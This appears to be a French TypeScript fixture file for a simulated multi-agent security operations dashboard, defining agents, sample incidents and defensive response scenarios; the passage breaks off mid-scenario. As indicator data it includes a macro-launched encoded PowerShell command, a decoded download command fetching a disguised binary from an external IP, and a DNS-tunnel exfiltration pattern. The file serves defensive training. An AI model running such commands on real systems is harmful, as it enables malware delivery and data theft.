import { AgentInfo, SecurityEvent, SimulationScenario, ChefDailyReport } from '../types/security';

export const INITIAL_AGENTS: AgentInfo[] = [
  {
    id: 'detecteur',
    name: 'Agent Détecteur',
    title: 'Surveillance Heuristique & Télémétrie',
    role: 'Repérage précoce d\'anomalies et signaux faibles',
    description: 'Repère en continu les événements suspects et écarts comportementaux dans les scénarios de test et flux d\'audit du bac à sable.',
    status: 'active',
    color: 'text-amber-400',
    iconName: 'Radar',
    processedCount: 1420,
    accuracyRate: '99.4%',
    lastAction: 'Scan d\'intégrité des flux réseau de démonstration terminé',
    capabilities: [
      'Surveillance des journaux d\'événements (Syslog/EDR simulés)',
      'Détection d\'anomalies volumétriques et de signatures',
      'Filtrage du bruit et des faux positifs bénins',
      'Extraction des signaux faibles pré-incident'
    ],
    responsibilities: [
      'Ingérer les alertes des sondes de simulation',
      'Qualifier la suspicion initiale',
      'Transmettre le paquet d\'indices à l\'Agent Analyste'
    ]
  },
  {
    id: 'analyste',
    name: 'Agent Analyste',
    title: 'Corrélation IoC & Investigation Tactique',
    role: 'Examen approfondi des métadonnées et contexte',
    description: 'Examine minutieusement les informations associées aux événements suspects, extrait les marqueurs techniques (IoC) et cartographie la technique.',
    status: 'active',
    color: 'text-orange-400',
    iconName: 'Search',
    processedCount: 984,
    accuracyRate: '98.9%',
    lastAction: 'Extraction IoC : 3 hashs SHA256 & 2 domaines C2 identifiés',
    capabilities: [
      'Décomposition des traces d\'exécution et payloads',
      'Extraction IoC (adresses IP, hashs, chaînes obfusquées)',
      'Corrélation avec les tactiques MITRE ATT&CK simulées',
      'Établissement de la chronologie d\'infection'
    ],
    responsibilities: [
      'Contextualiser la nature exacte du vecteur',
      'Déterminer les cibles et dépendances du système test',
      'Fournir le dossier d\'investigation à l\'Agent Risque'
    ]
  },
  {
    id: 'risque',
    name: 'Agent Risque',
    title: 'Évaluation d\'Impact & Explicabilité',
    role: 'Attribution du niveau de gravité et justification',
    description: 'Attribue un niveau de gravité objectif (Faible, Élevé, Critique) assorti d\'un score chiffré et d\'une explication argumentée pour les opérateurs.',
    status: 'active',
    color: 'text-rose-400',
    iconName: 'Gauge',
    processedCount: 865,
    accuracyRate: '99.1%',
    lastAction: 'Calcul de criticité : Seuil Critique validé avec justification',
    capabilities: [
      'Calcul du score de risque composite (0-100)',
      'Classification stricte à 3 niveaux : Faible / Élevé / Critique',
      'Matrice d\'impact sur la confidentialité, intégrité et disponibilité',
      'Production de justifications explicables sans boîte noire'
    ],
    responsibilities: [
      'Rendre un arbitrage de gravité mesuré',
      'Déterminer le palier d\'urgence requis',
      'Suggérer la typologie de réponse à l\'Agent Protection'
    ]
  },
  {
    id: 'protection',
    name: 'Agent Protection',
    title: 'Orchestration de Riposte Contrôlée',
    role: 'Exécution d\'actions de démonstration autorisées',
    description: 'Exécute exclusivement les actions de démonstration expressément autorisées dans le bac à sable (isolement simulé, règles de filtrage test, quarantaine).',
    status: 'idle',
    color: 'text-red-500',
    iconName: 'ShieldAlert',
    processedCount: 412,
    accuracyRate: '100%',
    lastAction: 'Mesure de protection simulée appliquée : Règle Sandbox IPTables #409',
    capabilities: [
      'Isolement logique simulé de l\'hôte virtuel test',
      'Création de règles de filtrage IP/DNS dans l\'environnement bac à sable',
      'Mise en quarantaine simulée de fichiers suspects',
      'Révocation immédiate de jetons d\'accès de démonstration'
    ],
    responsibilities: [
      'N\'agir que sur des environnements étanches de démonstration',
      'Respecter les seuils de gravité (aucune action lourde sur risque faible)',
      'Soumettre le résultat d\'intervention à l\'Agent Vérification'
    ]
  },
  {
    id: 'verification',
    name: 'Agent Vérification',
    title: 'Audit Post-Action & Contrôle d\'Intégrité',
    role: 'Vérification du résultat des actions simulées',
    description: 'Vérifie rigoureusement l\'efficacité des actions simulées, confirme que la menace est neutralisée et s\'assure de l\'absence d\'effet de bord.',
    status: 'active',
    color: 'text-emerald-400',
    iconName: 'ShieldCheck',
    processedCount: 412,
    accuracyRate: '100%',
    lastAction: 'Contrôle d\'intégrité sandbox validé : Zéro menace résiduelle',
    capabilities: [
      'Contrôle de clôture de vecteurs d\'attaque dans le bac à sable',
      'Vérification de l\'absence d\'effets de bord opérationnels',
      'Test de non-régression des services applicatifs de démo',
      'Validation de la preuve d\'endiguement'
    ],
    responsibilities: [
      'Auditer l\'efficacité de la mesure simulée',
      'Mesurer l\'état du système test après intervention',
      'Certifier la résolution auprès du Chef Agent'
    ]
  },
  {
    id: 'chef',
    name: 'Chef Agent',
    title: 'Supervision Globale & Synthèse Opérationnelle',
    role: 'Coordination, consensus, alertes et rapports SOC',
    description: 'Coordonne l\'ensemble des agents logiciels, valide le consensus décisionnel, arbitre les alertes et rédige les résumés et rapports exécutifs.',
    status: 'active',
    color: 'text-amber-500',
    iconName: 'Crown',
    processedCount: 412,
    accuracyRate: '99.8%',
    lastAction: 'Rapport exécutif 24h généré et archivé',
    capabilities: [
      'Arbitrage et maintien du consensus multi-agents',
      'Déclenchement des alertes prioritaires pour les équipes SOC',
      'Génération automatique de résumés d\'incidents clairs et lisibles',
      'Rédaction du rapport quotidien de cyberdéfense'
    ],
    responsibilities: [
      'Garantir la cohérence et l\'éthique de la chaîne d\'analyse',
      'Notifier le responsable de sécurité en cas de menace critique',
      'Fournir des recommandations d\'amélioration continue'
    ]
  }
];

export const INITIAL_EVENTS: SecurityEvent[] = [
  {
    id: 'EVT-2026-9041',
    timestamp: 'Il y a 4 min',
    source: 'Poste Comptabilité [V-DESK-09]',
    target: 'Dossier Partagé Finance',
    category: 'Fichier suspect',
    title: 'Macro malveillante avec tentative d\'injection mémoire',
    description: 'Détection d\'un classeur Excel nommé "Facture_Urgence_Mars.xlsm" exécutant un script PowerShell obfusqué vers une adresse IP externe non répertoriée.',
    riskLevel: 'Critique',
    riskScore: 94,
    status: 'Clôturé',
    ioc: {
      hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      ip: '185.220.101.5',
      filePath: 'C:\\Users\\Compta\\Downloads\\Facture_Urgence_Mars.xlsm',
      process: 'powershell.exe -ExecutionPolicy Bypass -NoProfile'
    },
    mitre: {
      id: 'T1204.002',
      name: 'User Execution: Malicious File',
      tactic: 'Execution'
    },
    simulatedAction: 'Quarantaine immédiate du fichier test et isolement réseau virtuel de l\'hôte LAB.',
    verificationResult: 'Processus PowerShell neutralisé en bac à sable. Connexions sortantes révoquées.',
    chefAgentSummary: 'Incident critique contenu en 1.8s. Fichier de démonstration neutralisé. Notification d\'urgence simulée transmise au RSSI.',
    involvedAgents: ['detecteur', 'analyste', 'risque', 'protection', 'verification', 'chef']
  },
  {
    id: 'EVT-2026-9039',
    timestamp: 'Il y a 18 min',
    source: 'Passerelle SSO / Auth [GW-AUTH-02]',
    target: 'Compte Administrateur [admin_secops@lab]',
    category: 'Tentative de connexion',
    title: 'Brute-force distribué et anomalie de géolocalisation',
    description: '28 tentatives d\'authentification échouées en 45 secondes depuis 12 nœuds VPN avec tentative de saut géographique (Paris puis Séoul).',
    riskLevel: 'Élevé',
    riskScore: 78,
    status: 'Clôturé',
    ioc: {
      ip: '194.26.29.114',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Python-requests/2.31.0'
    },
    mitre: {
      id: 'T1110.003',
      name: 'Brute Force: Password Spraying',
      tactic: 'Credential Access'
    },
    simulatedAction: 'Blocage temporaire simulé des adresses IP sources dans la passerelle de test et verrouillage de session.',
    verificationResult: 'Flux de requêtes interrompu. Aucun jeton émis.',
    chefAgentSummary: 'Attaque par pulvérisation de mots de passe simulée bloquée au niveau de la passerelle de test.',
    involvedAgents: ['detecteur', 'analyste', 'risque', 'protection', 'verification', 'chef']
  },
  {
    id: 'EVT-2026-9034',
    timestamp: 'Il y a 42 min',
    source: 'Passerelle Messagerie [MAIL-FILTER-01]',
    target: 'Boîte de réception [direction@lab.entreprise]',
    category: 'Email de phishing',
    title: 'Spear-phishing avec domaine leurre typo-squatté',
    description: 'Courriel usurpant l\'identité de la direction informatique avec lien dirigeant vers le domaine factice "portail-authentification-sso.xyz".',
    riskLevel: 'Élevé',
    riskScore: 72,
    status: 'Clôturé',
    ioc: {
      domain: 'portail-authentification-sso.xyz',
      ip: '91.215.85.19',
      filePath: 'PJ_Mise_A_Jour_Obligatoire.pdf'
    },
    mitre: {
      id: 'T1566.002',
      name: 'Phishing: Spearphishing Link',
      tactic: 'Initial Access'
    },
    simulatedAction: 'Neutralisation simulée de l\'URL au niveau du résolveur DNS de test et mise en quarantaine du message.',
    verificationResult: 'Lien désactivé dans le bac à sable. Aucun utilisateur test n\'a transmis d\'identifiants.',
    chefAgentSummary: 'Campagne d\'hameçonnage ciblé de test interceptée avant consultation.',
    involvedAgents: ['detecteur', 'analyste', 'risque', 'protection', 'verification', 'chef']
  },
  {
    id: 'EVT-2026-9028',
    timestamp: 'Il y a 1h 15m',
    source: 'Serveur Web Intranet [SRV-WEB-INT]',
    target: 'Contrôleur de Domaine [DC-01]',
    category: 'Activité malveillante',
    title: 'Balayage furtif de ports et énumération LDAP',
    description: 'Activité de reconnaissance interne anormale avec requêtes d\'énumération de groupes Active Directory de test via tunnel DNS.',
    riskLevel: 'Faible',
    riskScore: 35,
    status: 'Clôturé',
    ioc: {
      ip: '10.0.4.15',
      process: 'nmap_scan_eval.exe'
    },
    mitre: {
      id: 'T1046',
      name: 'Network Service Discovery',
      tactic: 'Discovery'
    },
    simulatedAction: 'Enregistrement de l\'événement dans le journal d\'audit avec augmentation de la sensibilité de surveillance.',
    verificationResult: 'Activité contenue dans la plage horaire autorisée d\'exercice défensif.',
    chefAgentSummary: 'Sonde de découverte passive simulée sans impact direct. Journalisation renforcée sans blocage invasif.',
    involvedAgents: ['detecteur', 'analyste', 'risque', 'chef']
  },
  {
    id: 'EVT-2026-9022',
    timestamp: 'Il y a 2h 40m',
    source: 'Poste R&D [V-DESK-22]',
    target: 'Serveur de Dépôt Git Interne',
    category: 'Autre',
    title: 'Téléchargement volumineux de sources hors horaires standards',
    description: 'Clonage intégral de 14 dépôts de code source confidentiel simulés à 02:40 du matin avec adresse IP interne légitime.',
    riskLevel: 'Faible',
    riskScore: 28,
    status: 'Clôturé',
    ioc: {
      ip: '10.0.2.88',
      process: 'git.exe'
    },
    mitre: {
      id: 'T1530',
      name: 'Data from Cloud Storage Object',
      tactic: 'Collection'
    },
    simulatedAction: 'Consignation télémétrique et notification de contrôle à l\'analyste de garde.',
    verificationResult: 'Événement corrélé avec une tâche de sauvegarde nocturne planifiée de démonstration.',
    chefAgentSummary: 'Faux positif opérationnel identifié et documenté dans la base de confiance du système.',
    involvedAgents: ['detecteur', 'analyste', 'risque', 'chef']
  }
];

export const PRESET_SCENARIOS: SimulationScenario[] = [
  {
    id: 'scenario-macro-excel',
    title: 'Fichier suspect : Macro Excel malveillante',
    category: 'Fichier suspect',
    difficulty: 'Complexe',
    description: 'Une pièce jointe factice "Bon_Commande_2026_Urgent.xlsm" est ouverte par un utilisateur test. La macro tente de lancer PowerShell pour télécharger un dropper simulé.',
    targetSystem: 'Poste de travail [ENV-SANDBOX-PC12]',
    sourceEntity: 'Origine externe non fiable : archive ZIP chiffrée',
    initialPayload: 'VBA: Auto_Open() -> Shell("powershell -enc aQB3AHIAIAAtAHUAcgBpACAAaAB0AHQAcAA6AC8ALw...")',
    expectedRisk: 'Critique',
    steps: [
      {
        stepNumber: 1,
        agentId: 'detecteur',
        agentName: 'Agent Détecteur',
        phase: 'Détection d\'anomalie',
        summary: 'Repérage du déclenchement inhabituel d\'un processus enfant PowerShell par Excel',
        reasoning: 'L\'exécution d\'un sous-processus d\'interpréteur de commandes (powershell.exe) directement issu d\'une application bureautique (excel.exe) constitue une anomalie comportementale majeure.',
        details: [
          'Processus parent : EXCEL.EXE (PID: 4892)',
          'Processus enfant : powershell.exe (PID: 7304)',
          'Ligne de commande contenant un commutateur Base64 obfusqué',
          'Alerte de niveau 1 émise vers le pipeline d\'analyse'
        ],
        technicalData: {
          parentProcess: 'EXCEL.EXE',
          spawnedProcess: 'powershell.exe',
          executionSignature: 'SUSP_VBA_CHILD_PROCESS',
          anomalyConfidence: '97%'
        },
        durationMs: 800
      },
      {
        stepNumber: 2,
        agentId: 'analyste',
        agentName: 'Agent Analyste',
        phase: 'Analyse et extraction IoC',
        summary: 'Décodage de la charge utile et extraction des marqueurs de compromission',
        reasoning: 'Le décodage de la charge Base64 révèle une requête Invoke-WebRequest vers une adresse IP externe répertoriée dans les bases de menaces de démonstration comme nœud C2.',
        details: [
          'Charge décodée : IWR -Uri http://185.220.101.5/stage2.bin -OutFile %TEMP%\\svchost_update.exe',
          'Hash SHA256 calculé du fichier porteur : 9a78d2bf4116ac8795c43d789e9bb100',
          'Correspondance MITRE ATT&CK : T1059.001 (PowerShell) & T1105 (Ingress Tool Transfer)',
          'Dossier technique consolidé'
        ],
        technicalData: {
          c2Server: '185.220.101.5:8080',
          destinationTemp: '%TEMP%\\svchost_update.exe',
          mitreId: 'T1059.001 / T1105',
          extractedIoCCount: 3
        },
        durationMs: 1200
      },
      {
        stepNumber: 3,
        agentId: 'risque',
        agentName: 'Agent Risque',
        phase: 'Calcul de criticité et impact',
        summary: 'Attribution du niveau Critique (Score 94/100) avec justification détaillée',
        reasoning: 'La combinaison d\'exécution furtive, d\'obfuscation et de tentative de téléchargement d\'un binaire non signé représente un risque imminent de prise de contrôle à distance.',
        details: [
          'Évaluation de la criticité : CRITIQUE',
          'Score de risque calculé : 94 / 100',
          'Impact potentiel sur l\'intégrité du système test : 9.2/10',
          'Recommandation immédiate : Neutralisation et isolement simulé'
        ],
        technicalData: {
          calculatedScore: 94,
          severityLevel: 'Critique',
          cvssEquivalent: 9.2,
          escalationRequired: true
        },
        durationMs: 900
      },
      {
        stepNumber: 4,
        agentId: 'protection',
        agentName: 'Agent Protection',
        phase: 'Riposte simulée contrôlée',
        summary: 'Exécution des mesures défensives autorisées en environnement bac à sable',
        reasoning: 'En conformité avec la politique de sécurité pour le palier Critique, déclenchement de la quarantaine du fichier et coupure du réseau de démonstration pour ce nœud.',
        details: [
          '[SIMULATION] Terminaison forcée du processus PowerShell (PID: 7304)',
          '[SIMULATION] Déplacement du fichier test vers le dossier de quarantaine sécurisé',
          '[SIMULATION] Blocage au pare-feu virtuel de l\'IP 185.220.101.5',
          '[SIMULATION] Isolement logique du sous-réseau bac à sable'
        ],
        technicalData: {
          actionTarget: 'ENV-SANDBOX-PC12',
          mitigationMode: 'SIMULATION CONTRÔLÉE',
          sandboxPolicyApplied: 'DEFENSE_RULE_CRITICAL_ISOLATION',
          realSystemAltered: false
        },
        actionTakenSimulated: 'Processus test interrompu, fichier mis en quarantaine et adresse C2 bloquée dans le pare-feu du sandbox.',
        durationMs: 1100
      },
      {
        stepNumber: 5,
        agentId: 'verification',
        agentName: 'Agent Vérification',
        phase: 'Audit et contrôle d\'intégrité',
        summary: 'Validation du succès de la neutralisation et de l\'intégrité du système test',
        reasoning: 'La vérification active montre qu\'aucun processus résiduel n\'est actif et que les flux réseau vers le C2 simulé sont totalement scellés.',
        details: [
          'Contrôle de l\'arbre des processus : Zéro tâche suspecte active',
          'Vérification des tables de routage virtuelles : Règle de blocage active',
          'Test d\'intégrité des fichiers système : Aucun dommage constaté',
          'Certification d\'endiguement remise au Chef Agent'
        ],
        technicalData: {
          verificationStatus: 'CONFORME / NEUTRALISÉ',
          residualRisk: '0 %',
          serviceAvailability: '100 % (hors nœud test isolé)',
          integrityCertified: true
        },
        verificationCheck: 'Endiguement certifié : Menace neutralisée en 4.0 secondes sans altération du système hôte.',
        durationMs: 850
      },
      {
        stepNumber: 6,
        agentId: 'chef',
        agentName: 'Chef Agent',
        phase: 'Arbitrage et synthèse exécutive',
        summary: 'Clôture de l\'incident, notification prioritaire simulée et rapport d\'audit',
        reasoning: 'Tous les agents ont validé la chaîne de décision par consensus. Émission de l\'alerte prioritaire pour le responsable de sécurité et archivage.',
        details: [
          'Consensus multi-agents atteint à 100%',
          'Alerte prioritaire simulée émise à destination du RSSI / SOC',
          'Synthèse technique intégrée dans le rapport journalier',
          'Incident archivé sous la référence INC-2026-X01'
        ],
        technicalData: {
          incidentReference: 'INC-2026-X01',
          totalReactionTime: '4.85s',
          consensusScore: '100%',
          reportGenerated: true
        },
        durationMs: 950
      }
    ]
  },
  {
    id: 'scenario-connexion-bruteforce',
    title: 'Tentative de connexion inhabituelle : Brute-Force & Saut Géographique',
    category: 'Tentative de connexion',
    difficulty: 'Standard',
    description: 'Une vague de tentatives d\'authentification par force brute frappe la passerelle SSO de test, suivie d\'une tentative réussie depuis un pays inhabituel en moins de 3 minutes.',
    targetSystem: 'Passerelle SSO / IAM [AUTH-PORTAL-TEST]',
    sourceEntity: 'Réseau botnet simulé (14 adresses IP distribuées)',
    initialPayload: 'POST /api/v1/auth/login [54 requêtes / min, dictionnaire d\'identifiants simulé]',
    expectedRisk: 'Élevé',
    steps: [
      {
        stepNumber: 1,
        agentId: 'detecteur',
        agentName: 'Agent Détecteur',
        phase: 'Détection d\'anomalie',
        summary: 'Pic volumétrique de requêtes d\'authentification échouées sur un compte à privilèges',
        reasoning: 'Le débit de 54 requêtes par minute dépasse de 12 fois le seuil heuristique toléré pour un utilisateur humain.',
        details: [
          'Compte visé : admin_systeme@lab.local',
          '54 tentatives échouées en 60 secondes',
          'Variation rapide des en-têtes User-Agent',
          'Émission d\'une alerte de tentative d\'intrusion'
        ],
        technicalData: {
          failedAttempts: 54,
          rateLimitExceeded: true,
          targetAccount: 'admin_systeme@lab.local'
        },
        durationMs: 700
      },
      {
        stepNumber: 2,
        agentId: 'analyste',
        agentName: 'Agent Analyste',
        phase: 'Analyse et extraction IoC',
        summary: 'Détection d\'un saut géographique impossible et cartographie du botnet test',
        reasoning: 'L\'utilisateur légitime s\'est connecté depuis Lyon à 14h10. Une nouvelle tentative réussie survient à 14h13 depuis Singapour, vitesse physique de déplacement impossible.',
        details: [
          'Vecteur : Saut géographique impossible (Lyon -> Singapour en 3 min)',
          'Analyse des adresses IP : 14 adresses identifiées comme proxies de test',
          'MITRE ATT&CK : T1110.001 (Password Guessing) & T1078 (Valid Accounts)',
          'Recommandation de suspension de session'
        ],
        technicalData: {
          impossibleTravelVelocity: '18 400 km/h (Physiquement impossible)',
          compromisedAccount: 'admin_systeme@lab.local',
          botnetClusterNodes: 14
        },
        durationMs: 950
      },
      {
        stepNumber: 3,
        agentId: 'risque',
        agentName: 'Agent Risque',
        phase: 'Calcul de criticité et impact',
        summary: 'Attribution du niveau Élevé (Score 78/100) pour usurpation d\'identité probable',
        reasoning: 'Même si le compte cible possède de hauts privilèges, la politique de double facteur de test a empêché la persistance totale.',
        details: [
          'Niveau d\'alerte : ÉLEVÉ',
          'Score de risque : 78 / 100',
          'Danger d\'élévation de privilèges : 8.0/10',
          'Déclenchement du protocole de mesure de protection simulée'
        ],
        technicalData: {
          calculatedScore: 78,
          severityLevel: 'Élevé',
          privilegeLevel: 'Administrateur'
        },
        durationMs: 800
      },
      {
        stepNumber: 4,
        agentId: 'protection',
        agentName: 'Agent Protection',
        phase: 'Riposte simulée contrôlée',
        summary: 'Révocation immédiate des jetons et blocage temporaire des adresses IP test',
        reasoning: 'L\'application d\'un bannissement temporaire et la révocation des sessions actives neutralise l\'usurpation sans impacter les autres comptes.',
        details: [
          '[SIMULATION] Révocation immédiate de tous les jetons JWT du compte test',
          '[SIMULATION] Ajout d\'une règle de blocage 24h pour les 14 adresses IP sources',
          '[SIMULATION] Forçage du renouvellement de mot de passe à la prochaine connexion',
          '[SIMULATION] Notification envoyée au journal d\'incident'
        ],
        technicalData: {
          revokedTokensCount: 3,
          bannedIpsCount: 14,
          mitigationMode: 'SIMULATION CONTRÔLÉE'
        },
        actionTakenSimulated: 'Jetons d\'authentification révoqués et adresses IP du cluster de test temporairement bannies.',
        durationMs: 1000
      },
      {
        stepNumber: 5,
        agentId: 'verification',
        agentName: 'Agent Vérification',
        phase: 'Audit et contrôle d\'intégrité',
        summary: 'Contrôle de cessation des requêtes et audit de sécurité du compte',
        reasoning: 'Toutes les tentatives suivantes sont immédiatement rejetées par la passerelle de test avec un code HTTP 403 Forbidden.',
        details: [
          'Audit des requêtes sur l\'endpoint de connexion : Zéro accès non autorisé',
          'Vérification de l\'intégrité de la base d\'utilisateurs : Aucune modification',
          'Test de tentative de réutilisation de jeton : Rejetée (401 Invalid Token)',
          'Validation d\'efficacité délivrée'
        ],
        technicalData: {
          subsequentBlockedRequests: 18,
          accountState: 'Sécurisé & Verrouillé temporairement',
          sideEffects: 'Néant'
        },
        verificationCheck: 'Vérification terminée : Aucune session frauduleuse active, compte préservé.',
        durationMs: 800
      },
      {
        stepNumber: 6,
        agentId: 'chef',
        agentName: 'Chef Agent',
        phase: 'Arbitrage et synthèse exécutive',
        summary: 'Consignation de l\'incident et mise à jour de la liste de réputation de test',
        reasoning: 'L\'intervention rapide a contenu la tentative avant toute exfiltration ou propagation.',
        details: [
          'Consensus validé entre les 5 agents',
          'Alerte de niveau Élevé consignée et transmise à l\'équipe SOC',
          'Mise à jour des règles de détection comportementale',
          'Clôture du dossier INC-2026-X02'
        ],
        technicalData: {
          incidentReference: 'INC-2026-X02',
          totalReactionTime: '4.25s',
          status: 'Clôturé avec succès'
        },
        durationMs: 850
      }
    ]
  },
  {
    id: 'scenario-email-phishing',
    title: 'Email de phishing simulé : Spear-Phishing RH & Faux Certificat',
    category: 'Email de phishing',
    difficulty: 'Standard',
    description: 'Campagne de test simulant un courriel urgent "Renouvellement des droits de télétravail" incitant à cliquer sur un domaine factice hébergeant une fausse page de mire SSO.',
    targetSystem: 'Serveur de Messagerie de Démonstration [MAIL-EXP-01]',
    sourceEntity: 'Domaine d\'émission suspect : rh-support-portal.net',
    initialPayload: 'Email MIME avec lien hypertexte masqué : https://sso-tele-travail-connexion.xyz/auth',
    expectedRisk: 'Élevé',
    steps: [
      {
        stepNumber: 1,
        agentId: 'detecteur',
        agentName: 'Agent Détecteur',
        phase: 'Détection d\'anomalie',
        summary: 'Interception d\'un message avec incohérence d\'en-tête SPF/DKIM et lien typo-squatté',
        reasoning: 'L\'adresse d\'expéditeur apparente prétend provenir de l\'administration interne alors que l\'enregistrement SPF échoue et que le domaine du lien est tout récent.',
        details: [
          'Expéditeur déclaré : rh-securite@entreprise.com',
          'Expéditeur réel SMTP : noreply@rh-support-portal.net',
          'Échec de l\'authentification SPF / DKIM',
          'Objet du message : "[URGENT] Clôture immédiate de vos accès télétravail"'
        ],
        technicalData: {
          spfResult: 'FAIL',
          dkimResult: 'NONE',
          heuristicsTrigger: 'URGENCY_KEYWORD_MISMATCH'
        },
        durationMs: 750
      },
      {
        stepNumber: 2,
        agentId: 'analyste',
        agentName: 'Agent Analyste',
        phase: 'Analyse et extraction IoC',
        summary: 'Inspection du lien leurre et analyse de la page d\'atterrissage de simulation',
        reasoning: 'Le domaine cible a été enregistré il y a moins de 48 heures. Le certificat SSL est auto-signé et la page tente de capturer les identifiants en clair.',
        details: [
          'Domaine analysé : sso-tele-travail-connexion.xyz',
          'Âge du domaine : 1.4 jour',
          'Certificat SSL : Non reconnu / Auto-signé',
          'MITRE ATT&CK : T1566.002 (Spearphishing Link) & T1056.003 (Web Credential Harvesting)'
        ],
        technicalData: {
          targetPhishingUrl: 'https://sso-tele-travail-connexion.xyz/auth',
          domainAge: '< 48 heures',
          harvestingFormDetected: true
        },
        durationMs: 900
      },
      {
        stepNumber: 3,
        agentId: 'risque',
        agentName: 'Agent Risque',
        phase: 'Calcul de criticité et impact',
        summary: 'Attribution du niveau Élevé (Score 72/100) pour vol massif d\'identifiants potentiel',
        reasoning: 'Le courriel a été distribué à 18 collaborateurs de test. En l\'absence de réponse, le risque de compromission d\'identifiants est important.',
        details: [
          'Niveau de sévérité : ÉLEVÉ',
          'Score de risque : 72 / 100',
          'Facteur de propagation : 18 destinataires simulés ciblés',
          'Recommandation : Retrait préventif de toutes les boîtes aux lettres'
        ],
        technicalData: {
          calculatedScore: 72,
          severityLevel: 'Élevé',
          exposureCount: 18
        },
        durationMs: 800
      },
      {
        stepNumber: 4,
        agentId: 'protection',
        agentName: 'Agent Protection',
        phase: 'Riposte simulée contrôlée',
        summary: 'Mise en quarantaine du courriel et blocage du domaine au proxy test',
        reasoning: 'L\'action rapide empêche le clic de tout utilisateur de démonstration tout en neutralisant le domaine au niveau de la passerelle DNS.',
        details: [
          '[SIMULATION] Retrait automatique du message des 18 boîtes aux lettres de test',
          '[SIMULATION] Ajout du domaine sso-tele-travail-connexion.xyz dans le DNS sinkhole',
          '[SIMULATION] Inscription de l\'empreinte du message dans les filtres anti-spam',
          '[SIMULATION] Règle défensive active'
        ],
        technicalData: {
          purgedEmailsCount: 18,
          dnsSinkholed: true,
          mitigationMode: 'SIMULATION CONTRÔLÉE'
        },
        actionTakenSimulated: 'Courriels purgés des boîtes de messagerie de test et domaine ajouté au trou noir DNS simulé.',
        durationMs: 950
      },
      {
        stepNumber: 5,
        agentId: 'verification',
        agentName: 'Agent Vérification',
        phase: 'Audit et contrôle d\'intégrité',
        summary: 'Vérification de la purge et test d\'inaccessibilité du site de phishing',
        reasoning: 'L\'audit confirme qu\'aucun des 18 utilisateurs n\'a soumis le formulaire et que toute tentative d\'accès au domaine échoue immédiatement.',
        details: [
          'Contrôle des boîtes de réception : 18/18 messages purgés avec succès',
          'Test de résolution DNS : Redirigé vers la page d\'avertissement sécurisée 127.0.0.1',
          'Journaux proxy : 0 soumission d\'identifiants enregistrée',
          'Certification d\'innocuité délivrée'
        ],
        technicalData: {
          credentialTheftConfirmed: 0,
          resolutionBlocked: true,
          auditSuccess: '100%'
        },
        verificationCheck: 'Vérification terminée : Aucune compromission d\'identifiants, exposition résiduelle nulle.',
        durationMs: 850
      },
      {
        stepNumber: 6,
        agentId: 'chef',
        agentName: 'Chef Agent',
        phase: 'Arbitrage et synthèse exécutive',
        summary: 'Émission d\'une alerte de sensibilisation et archivage du scénario',
        reasoning: 'L\'incident illustre la nécessité d\'une détection de premier niveau sur les domaines récents.',
        details: [
          'Consensus validé à l\'unanimité',
          'Génération d\'un modèle d\'avertissement pour les utilisateurs test',
          'Rapport de sécurité mis à jour',
          'Dossier INC-2026-X03 clôturé'
        ],
        technicalData: {
          incidentReference: 'INC-2026-X03',
          totalReactionTime: '4.25s',
          remediation: 'Complète'
        },
        durationMs: 800
      }
    ]
  },
  {
    id: 'scenario-activite-malveillante',
    title: 'Activité malveillante : Mouvement latéral & Exfiltration par tunnel DNS',
    category: 'Activité malveillante',
    difficulty: 'Complexe',
    description: 'Une machine interne compromise simule une tentative d\'exploration furtive du réseau local et commence à exfiltrer des fragments de données via des sous-requêtes DNS encodées.',
    targetSystem: 'Serveur de Fichiers & Résolveur DNS [DC-DNS-01]',
    sourceEntity: 'Poste interne compromis [STATION-DEV-04]',
    initialPayload: 'DNS Tunneling : queries format <encoded_data>.data-exfil-test.cloud',
    expectedRisk: 'Critique',
    steps: [
      {
        stepNumber: 1,
        agentId: 'detecteur',
        agentName: 'Agent Détecteur',
        phase: 'Détection d\'anomalie',
        summary: 'Anomalie sur le volume et l\'entropie des requêtes DNS sortantes',
        reasoning: 'Une station de travail de test émet plus de 420 requêtes TXT et A par minute avec une entropie de Shannon très élevée sur les sous-domaines.',
        details: [
          'Volume anormal : 420 requêtes DNS / minute (seuil normal < 15)',
          'Entropie moyenne des labels de domaine : 4.82 (typique d\'une donnée chiffrée/encodée)',
          'Port source UDP 53 avec paquets fragmentés',
          'Signalement d\'un canal de commande ou d\'exfiltration sous-jacent'
        ],
        technicalData: {
          queriesPerMinute: 420,
          shannonEntropy: 4.82,
          protocol: 'DNS over UDP (Port 53)'
        },
        durationMs: 800
      },
      {
        stepNumber: 2,
        agentId: 'analyste',
        agentName: 'Agent Analyste',
        phase: 'Analyse et extraction IoC',
        summary: 'Reconstitution du flux et identification de la technique de tunnel DNS',
        reasoning: 'La concaténation des sous-domaines interrogés révèle la sérialisation de noms de fichiers de simulation provenant du dossier R&D.',
        details: [
          'Technique identifiée : Exfiltration via DNS Tunneling',
          'Domaine apex receveur : data-exfil-test.cloud',
          'Source de la transmission : Station de travail [STATION-DEV-04] (IP: 192.168.10.45)',
          'MITRE ATT&CK : T1071.004 (Application Layer Protocol: DNS) & T1048.003 (Exfiltration Over Alternative Protocol)'
        ],
        technicalData: {
          apexDomain: 'data-exfil-test.cloud',
          sourceHost: 'STATION-DEV-04',
          extractedFragmentSize: '34 Ko (données factices de test)'
        },
        durationMs: 1100
      },
      {
        stepNumber: 3,
        agentId: 'risque',
        agentName: 'Agent Risque',
        phase: 'Calcul de criticité et impact',
        summary: 'Attribution du niveau Critique (Score 96/100) pour fuite de données active',
        reasoning: 'La fuite active de données vers l\'extérieur combinée à un canal furtif constitue une situation d\'urgence maximale nécessitant une rupture immédiate de communication.',
        details: [
          'Niveau de criticité : CRITIQUE',
          'Score de risque : 96 / 100',
          'Impact sur la confidentialité : 9.8 / 10',
          'Urgence d\'intervention : Immédiate'
        ],
        technicalData: {
          calculatedScore: 96,
          severityLevel: 'Critique',
          urgencyIndex: 'Maximum (Niveau 3)'
        },
        durationMs: 850
      },
      {
        stepNumber: 4,
        agentId: 'protection',
        agentName: 'Agent Protection',
        phase: 'Riposte simulée contrôlée',
        summary: 'Rupture immédiate des requêtes DNS suspectes et isolement de la station test',
        reasoning: 'Le blocage au niveau du résolveur DNS interne coupe l\'exfiltration instantanément sans attendre l\'intervention physique sur le poste.',
        details: [
          '[SIMULATION] Injection d\'une règle de rejet immédiat pour le domaine data-exfil-test.cloud',
          '[SIMULATION] Isolement réseau logique du poste test [STATION-DEV-04]',
